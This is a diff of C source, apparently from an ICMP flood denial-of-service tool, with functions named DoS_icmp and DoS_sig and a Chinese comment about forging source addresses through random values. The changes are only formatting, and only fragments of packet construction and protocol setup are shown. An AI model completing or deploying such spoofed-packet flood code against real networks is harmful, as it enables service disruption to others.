@@ -43,7 +43,7 @@ static int alive = -1;
 //随机函数产生函数, 伪造原地址(由于系统的函数为伪随机函数, 因此每次用不同值进行初始化)
 static unsigned long myrandom(unsigned int begin, unsigned int end){
 	unsigned int uiTmp;
-	uiTmp =(unsigned int)( clock() % 2000 ) *( clock() % 2000 ) *( clock() % 1000 );
+	uiTmp = (unsigned int)( clock() % 2000 ) * ( clock() % 2000 ) * ( clock() % 1000 );
 	return (unsigned long)rand_r(&uiTmp) % end;
 }
 
@@ -51,8 +51,8 @@ static unsigned long myrandom(unsigned int begin, unsigned int end){
 
 static void DoS_icmp(void){
 	struct sockaddr_in to;
-	struct ip *iph;
-	struct icmp *icmph;
+	struct ip* iph;
+	struct icmp* icmph;
 	char *packet;
 	int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;
 	unsigned int tmp;
@@ -60,8 +60,8 @@ static void DoS_icmp(void){
 
 	//packet = malloc(pktsize);
 	packet = alloca(pktsize);
-	iph =(struct ip *)packet;
-	icmph =(struct icmp *)(packet + sizeof(struct ip));
+	iph =(struct ip*)packet;
+	icmph =(struct icmp*)(packet + sizeof(struct ip));
 	memset(packet, 0, pktsize);
 
 	//IP的版本,IPv4 
@@ -127,8 +127,8 @@ static void DoS_sig(int signo){
 
 
 int main(int argc, char *argv[]){
-	struct hostent * host = NULL;
-	struct protoent *protocol = NULL;
+	struct hostent* host = NULL;
+	struct protoent* protocol = NULL;
 	const char protoname[]= "icmp";
 
 	int i = 0;
